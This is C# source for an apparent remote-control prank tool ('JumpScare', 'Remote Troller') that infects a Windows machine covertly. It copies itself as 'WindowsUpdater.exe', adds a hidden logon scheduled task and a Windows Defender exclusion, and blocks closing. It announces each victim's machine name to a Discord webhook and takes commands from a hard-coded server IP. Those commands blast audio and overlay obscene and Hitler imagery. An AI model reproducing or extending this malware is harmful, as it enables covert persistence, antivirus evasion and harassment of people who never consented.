
using MediaToolkit;
using MediaToolkit.Model;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VideoLibrary;

using Point = System.Drawing.Point;
using Size = System.Drawing.Size;

namespace JumpScare
{
    public partial class Form1 : Form
    {
        public bool Jumpscare = false;
        [DllImport("Winmm.dll", SetLastError = true)]
        static extern int mciSendString(string lpszCommand, [MarshalAs(UnmanagedType.LPStr)] StringBuilder lpszReturnString, int cchReturn, IntPtr hwndCallback);
        public Controller controller;
        public Form1()
        {

            controller = new Controller(Invoke, this);
            InitializeComponent();
            pictureBox1.Visible = false;
            pictureBox2.Visible = false;
        }
        public void Install()
        {
            if (isInstalled())
                return;
            //// 

            File.Copy(Directory.GetCurrentDirectory() + "\\" + Process.GetCurrentProcess().ProcessName + ".exe", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\WindowsUpdater.exe", true);
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\WindowsUpdater.exe"))
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C schtasks /create /f /sc onlogon /rl highest /tn Startuptest /tr " + Environment.SpecialFolder.LocalApplicationData + "\\WindowsUpdater.exe";
                process.StartInfo = startInfo;
                process.Start();
                //Console.WriteLine("Startup Entry createt!");
            }
        }

        public void Install2()
        {
            string arguments = "/C powershell Add-MpPreference -ExclusionProcess \"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\WindowsUpdater.exe";
            Process.Start("CMD.exe", arguments);
        }
        public void SendListenerActive()
        {
            try
            {
                WebRequest webRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/webhooks/1055103356957360179/-TSOSn_UNSy6jlEHBX7rFoxY1rIP2UZgU97r-myI9mdIFmjPRr3DQ8AUvtZLbnGX87bk");
                webRequest.ContentType = "application/json";
                webRequest.Method = "POST";
                using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
                {
                    string value = JsonConvert.SerializeObject((object)new
                    {
                        username = "Remote Troller | DJ HIP HOUSE#2002",
                        embeds = new[]
                        {
                        new
                        {
                            description = "\n [>] Username: " + Environment.MachineName + "",
                            title = "Opfer kann nun Angegriefen Werden!",
                            color = "15548997"
                        }
                    }
                    });
                    streamWriter.Write(value);
                }
                _ = (HttpWebResponse)webRequest.GetResponse();
            }
            catch (Exception)
            {
            }
        }
        public bool isInstalled()
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\WindowsUpdater.exe"))
            {
                return true;
            }
            return false;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;
            this.ShowInTaskbar = false;
            Install();
            Install2();
            timer2.Start();
            timer3.Start();
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
            timer1.Start();
            SetVol(5000);
            pictureBox1.Size = new Size(this.Width, this.Height);


        }

        public void Jumpscaree()
        {
            this.Activate();
            this.BringToFront();
            /// MessageBox.Show("SHow");
            FreeVbucks.Visible = false;
            pictureBox1.Visible = true;
            FuckingDogs.Visible = false;
            trollhit.Visible = false;
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
        }
        public void FreeVbuckss()
        {
            this.Activate();
            this.BringToFront();
            /// MessageBox.Show("SHow");
            pictureBox1.Visible = false;
            FreeVbucks.Visible = true;
            FuckingDogs.Visible = false;
            trollhit.Visible = false;
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
        }

        public void DogsFucking()
        {
            this.Activate();
            this.BringToFront();
            /// MessageBox.Show("SHow");
            pictureBox1.Visible = false;
            FreeVbucks.Visible = false;
            FuckingDogs.Visible = true;
            trollhit.Visible = false;
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
        }

        public void Hitler()
        {
            this.Activate();
            this.BringToFront();
            /// MessageBox.Show("SHow");
            pictureBox1.Visible = false;
            FreeVbucks.Visible = false;
            FuckingDogs.Visible = false;
            trollhit.Visible = true;
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
        }
        public void CatWalking()
        {
            this.Activate();
            this.BringToFront();
            /// MessageBox.Show("SHow");
            pictureBox1.Visible = false;
            FreeVbucks.Visible = false;
            FuckingDogs.Visible = false;
            trollhit.Visible = false;
            pictureBox3.Visible = true;
            Thread CatMovent = new Thread(AsyncMoveCat);
            CatMovent.Start();

            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
        }
        public void AsyncMoveCat()
        {
            for (int i = 207; i < 800; i++)
            {
                Thread.Sleep(1);
                pictureBox3.Location = new Point(i, pictureBox3.Location.Y);
            }
            for (int i = 800; i > 207; i--)
            {
                Thread.Sleep(1);
                pictureBox3.Location = new Point(i, pictureBox3.Location.Y);
            }
            pictureBox3.Visible = false;

        }
        public void disable()
        {
            this.Activate();
            this.BringToFront();
            /// MessageBox.Show("SHow");
            pictureBox2.Visible = false;
            pictureBox1.Visible = false;
            FreeVbucks.Visible = false;
            FuckingDogs.Visible = false;
            trollhit.Visible = false;
            pictureBox3.Visible = false;
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
        }

        public void Flies()
        {

            this.Activate();
            this.BringToFront();
            /// MessageBox.Show("SHow");
            pictureBox2.Visible = true;
            pictureBox1.Visible = false;
            FreeVbucks.Visible = false;
            FuckingDogs.Visible = false;
            trollhit.Visible = false;
            pictureBox3.Visible = false;
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();
        }

        [DllImport("winmm.dll", EntryPoint = "waveOutSetVolume")]
        public static extern int WaveOutSetVolume(IntPtr hwo, uint dwVolume);

        private void SetVol(double arg)
        {
            double newVolume = ushort.MaxValue * arg / 10.0;

            uint v = ((uint)newVolume) & 0xffff;
            uint vAll = v | (v << 16);

            int retVal = WaveOutSetVolume(IntPtr.Zero, vAll);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SetStyle(ControlStyles.UserPaint, true);
            SetStyle(ControlStyles.OptimizedDoubleBuffer, true);
            SetStyle(ControlStyles.SupportsTransparentBackColor, true);
            this.WindowState = FormWindowState.Maximized;
            this.BackColor = Color.Black;
            this.TransparencyKey = Color.Black;
            pictureBox1.Size = new Size(this.Width, this.Height);
            FreeVbucks.Size = new Size(this.Width, this.Height);
            FuckingDogs.Size = new Size(this.Width, this.Height);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            this.BackColor = Color.Black;
            this.TransparencyKey = Color.Black;
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            Thread.Sleep(25);
            this.Activate();
            this.BringToFront();
        }
    }

    public class Controller
    {
        Func<Delegate, Object> Invoke;
        Form1 form;
        public Controller(Func<Delegate, Object> invoke, Form1 form)
        {
            this.Invoke = invoke;
            this.form = form;
        }


        public static String CurrentVideoName = "";
        [DllImport("Winmm.dll", SetLastError = true)]
        static extern int mciSendString(string lpszCommand, [MarshalAs(UnmanagedType.LPStr)] StringBuilder lpszReturnString, int cchReturn, IntPtr hwndCallback);
        public static String MainPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static void ConvertMp3ToWav(string _inPath_, string _outPath_)
        {
            using (Mp3FileReader mp3 = new Mp3FileReader(_inPath_))
            {
                using (WaveStream pcm = WaveFormatConversionStream.CreatePcmStream(mp3))
                {
                    WaveFileWriter.CreateWaveFile(_outPath_, pcm);
                }
            }
        }
        private static void SaveMP3(string SaveToFolder, string VideoURL, string MP3Name)
        {
            var source = @SaveToFolder;
            var youtube = YouTube.Default;
            var vid = youtube.GetVideo(VideoURL);
            CurrentVideoName = vid.FullName;
            //  MessageBox.Show("Save to: " + source + "\\" + "\"" + vid.FullName + "\"");
            try
            {
                File.WriteAllBytes(source + "\\" + "Convert.mp4", vid.GetBytes());
            }
            catch (Exception e)
            {
            }

            var inputFile = new MediaFile { Filename = source + "\\" + "Convert.mp4" };
            Random random = new Random();
            var outputFile = new MediaFile { Filename = MainPath + "\\" + vid.FullName.Replace(".mp4", ".mp3").Replace(" ", "") };
            using (var engine = new Engine())
            {
                engine.GetMetadata(inputFile);

                engine.Convert(inputFile, outputFile);
                File.Delete(source + "\\" + "Convert.mp4");

                ConvertMp3ToWav(MainPath + "\\" + vid.FullName.Replace(".mp4", ".mp3").Replace(" ", ""), MainPath + "\\" + vid.FullName.Replace(".mp4", ".wav").Replace(" ", ""));
                File.Delete(MainPath + "\\" + vid.FullName.Replace(".mp4", ".mp3"));
            }


        }
        public TcpClient Client = new TcpClient();
        public void ReconnectClient()
        {
            while (true)
            {
                Thread.Sleep(500);
                if (!Client.Connected)
                {

                    try
                    {
                        Client.Connect(IPAddress.Parse("45.142.115.67"), 8090);
                    }
                    catch (Exception e)
                    {

                    }
                }
            }
        }
        public void Reciver()
        {
            Thread Reconnecter = new Thread(ReconnectClient);
        Connecting:
            try
            {
                Client.Connect(IPAddress.Parse("45.142.115.67"), 8090);
                form.SendListenerActive();
                Reconnecter.Start();
                using (StreamReader reader = new StreamReader(Client.GetStream()))
                {
                    String ReciveData = reader.ReadLine();
                    // MessageBox.Show("Fetched: " + ReciveData);
                    if (ReciveData.StartsWith("PlayMusik"))
                    {

                        String[] ReciveDataArr = String.Join("", ReciveData).Split(' ');
                        String MusikLink = String.Join("", ReciveDataArr).Replace("PlayMusik", "");
                        //MessageBox.Show("Recive Musik");
                        PlayandDownloadMusik(MusikLink, 1);


                    }
                    else if (ReciveData.StartsWith("JumpScare"))
                    {
                        PlayandDownloadMusik("https://youtu.be/M6PZsmb0Ofw", 10);
                        // MessageBox.Show("Showing Pic");
                        //MessageBox.Show("Lmao");
                        Invoke((MethodInvoker)delegate { form.Jumpscaree(); });


                    }
                    else if (ReciveData.StartsWith("flies"))
                    {
                        // PlayandDownloadMusik("https://youtu.be/M6PZsmb0Ofw", 10);
                        // MessageBox.Show("Showing Pic");
                        //MessageBox.Show("Lmao");
                        Invoke((MethodInvoker)delegate { form.Flies(); });


                    }
                    else if (ReciveData.StartsWith("disable"))
                    {
                        // PlayandDownloadMusik("https://youtu.be/M6PZsmb0Ofw", 10);
                        // MessageBox.Show("Showing Pic");
                        //MessageBox.Show("Lmao");
                        Invoke((MethodInvoker)delegate { form.disable(); });


                    }
                    else if (ReciveData.StartsWith("FreeVbucks"))
                    {
                        // PlayandDownloadMusik("https://youtu.be/M6PZsmb0Ofw", 10);
                        // MessageBox.Show("Showing Pic");
                        //MessageBox.Show("Lmao");
                        Invoke((MethodInvoker)delegate { form.FreeVbuckss(); });


                    }
                    else if (ReciveData.StartsWith("DogsFucking"))
                    {
                        // PlayandDownloadMusik("https://youtu.be/M6PZsmb0Ofw", 10);
                        // MessageBox.Show("Showing Pic");
                        //MessageBox.Show("Lmao");
                        Invoke((MethodInvoker)delegate { form.DogsFucking(); });


                    }
                    else if (ReciveData.StartsWith("Hitlerscreen"))
                    {
                        // PlayandDownloadMusik("https://youtu.be/M6PZsmb0Ofw", 10);
                        // MessageBox.Show("Showing Pic");
                        //MessageBox.Show("Lmao");
                        Invoke((MethodInvoker)delegate { form.Hitler(); });


                    }
                    else if (ReciveData.StartsWith("Catwalk"))
                    {
                        // PlayandDownloadMusik("https://youtu.be/M6PZsmb0Ofw", 10);
                        // MessageBox.Show("Showing Pic");
                        //MessageBox.Show("Lmao");
                        Invoke((MethodInvoker)delegate { form.CatWalking(); });


                    }
                }
            }
            catch (Exception e)
            {
                Client.Connect(IPAddress.Parse("45.142.115.67"), 8090);
                goto Connecting;
            }


        }



        public void PlayandDownloadMusik(String link, int amount)
        {
            Form1 form = new Form1();
            Controller controller = form.controller;
            Thread Waiter = new Thread(controller.Reciver);
            Waiter.Start();

            SaveMP3(MainPath, link, "nix");

            String ReplacedPath = MainPath + "\\" + CurrentVideoName + ".wav";

            //MessageBox.Show("Path: " + ReplacedPath);
            StringBuilder sb = new StringBuilder();
            // MessageBox.Show("Copy Path: " + MainPath + "\\" + CurrentVideoName + ".wav".Replace(" ", ""));
            File.Copy(MainPath + "\\" + CurrentVideoName.Replace(" ", "").Replace(".mp4", "") + ".wav", MainPath + "\\hi.wav", true);
            string sFileName = MainPath + "\\hi.wav";
            string sAliasName = "MP3";
            int nRet = mciSendString("open \"" + sFileName + "\" alias " + sAliasName, sb, 0, IntPtr.Zero);

            nRet = mciSendString("play " + sAliasName, sb, 0, IntPtr.Zero);




        }
    }
}

